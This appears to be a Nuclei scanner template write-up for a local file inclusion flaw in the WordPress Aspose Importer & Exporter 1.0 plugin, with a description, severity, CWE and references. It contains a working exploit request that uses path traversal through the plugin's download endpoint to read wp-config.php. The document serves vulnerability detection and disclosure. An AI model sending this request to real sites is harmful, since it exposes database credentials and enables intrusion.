# Nuclei Template: WordPress Aspose Importer & Exporter 1.0 - Local File Inclusion
**Template ID:** aspose-ie-file-download
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`aspose-ie-file-download.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Aspose Importer & Exporter version 1.0 is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/aspose-importer-exporter/aspose_import_export_download?file=../../../wp-config.php
```

## References
- https://packetstormsecurity.com/files/131162/
- https://wordpress.org/plugins/aspose-importer-exporter
